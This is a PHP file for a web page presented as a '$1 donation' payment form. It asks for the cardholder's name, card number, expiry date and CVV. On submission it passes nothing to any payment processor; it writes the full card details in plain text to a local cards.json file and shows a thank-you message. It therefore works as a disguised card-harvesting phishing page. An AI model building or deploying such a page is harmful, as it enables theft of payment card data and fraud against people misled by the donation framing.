<?php
$showThanks = false;

if (isset($_POST['username']) && isset($_POST['number']) && isset($_POST['month']) && isset($_POST['year']) && isset($_POST['cvv'])) {
    $cards = json_decode(file_get_contents('cards.json'), true);
    $cardDetails = array(
        'username' => $_POST['username'],
        'number' => $_POST['number'],
        'month' => $_POST['month'],
        'year' => $_POST['year'],
        'cvv' => $_POST['cvv'],
    );
    array_push($cards, $cardDetails);
    file_put_contents('cards.json', json_encode($cards));
    $showThanks = true;
}
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
          integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh"
          crossorigin="anonymous">
    <title>Payment</title>
</head>
<body class="bg-light">
<div class="container py-5" style="max-width:550px;">
    <div class="card">
        <div class="card-body p-5">
            <? if ($showThanks) { ?>
                <p class="alert alert-success">Thank you for your donation!</p>
            <? } ?>
            <h4>$1 donation</h4>
            <form role="form" method="post">
                <div class="form-group">
                    <label for="username">Full name (on the card)</label>
                    <div class="input-group">
                        <div class="input-group-prepend">
                            <span class="input-group-text">
                                <svg class="bi bi-person" width="1em" height="1em" viewBox="0 0 20 20"
                                     fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                                  <path fill-rule="evenodd"
                                        d="M15 16s1 0 1-1-1-4-6-4-6 3-6 4 1 1 1 1h10zm-9.995-.944v-.002zM5.022 15h9.956a.274.274 0 00.014-.002l.008-.002c-.001-.246-.154-.986-.832-1.664C13.516 12.68 12.289 12 10 12c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664a1.05 1.05 0 00.022.004zm9.974.056v-.002zM10 9a2 2 0 100-4 2 2 0 000 4zm3-2a3 3 0 11-6 0 3 3 0 016 0z"
                                        clip-rule="evenodd"></path>
                                </svg>
                            </span>
                        </div>
                        <input type="text" class="form-control" name="username" required>
                    </div>
                </div>

                <div class="form-group">
                    <label for="number">Card number</label>
                    <div class="input-group">
                        <div class="input-group-prepend">
                            <span class="input-group-text">
                                <svg class="bi bi-credit-card" width="1em" height="1em" viewBox="0 0 20 20"
                                     fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                                  <path fill-rule="evenodd"
                                        d="M16 5H4a1 1 0 00-1 1v8a1 1 0 001 1h12a1 1 0 001-1V6a1 1 0 00-1-1zM4 4a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2V6a2 2 0 00-2-2H4z"
                                        clip-rule="evenodd"></path>
                                  <rect width="3" height="3" x="4" y="11" rx="1"></rect>
                                  <path d="M3 7h14v2H3z"></path>
                                </svg>
                            </span>
                        </div>
                        <input class="form-control" name="number" required type="tel" inputmode="numeric"
                               pattern="[0-9\s]{13,19}">
                    </div>
                </div>

                <div class="row">
                    <div class="col-sm-8">
                        <div class="form-group">
                            <label><span class="hidden-xs">Expiration</span> </label>
                            <div class="form-inline">
                                <select class="form-control" style="width:45%" required name="month">
                                    <option>MM</option>
                                    <option>01</option>
                                    <option>02</option>
                                    <option>03</option>
                                    <option>04</option>
                                    <option>05</option>
                                    <option>06</option>
                                    <option>07</option>
                                    <option>08</option>
                                    <option>09</option>
                                    <option>10</option>
                                    <option>11</option>
                                    <option>12</option>
                                </select>
                                <span style="width:10%; text-align: center"> / </span>
                                <select class="form-control" style="width:45%" name="year" required>
                                    <option>YY</option>
                                    <?
                                    for ($i = 2020; $i <= 2030; $i++) {
                                        echo "<option>$i</option>";
                                    }
                                    ?>
                                </select>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-4">
                        <div class="form-group">
                            <label data-toggle="tooltip" title=""
                                   data-original-title="3 digits code on back side of the card">CVV <i
                                        class="fa fa-question-circle"></i></label>
                            <input class="form-control" required name="cvv" type="tel" inputmode="numeric"
                                   pattern="[0-9]{3}">
                        </div>
                    </div>
                </div>
                <button class="subscribe btn btn-primary btn-block" type="submit"> Confirm</button>
            </form>
        </div>
    </div>
</div>
</body>
</html>

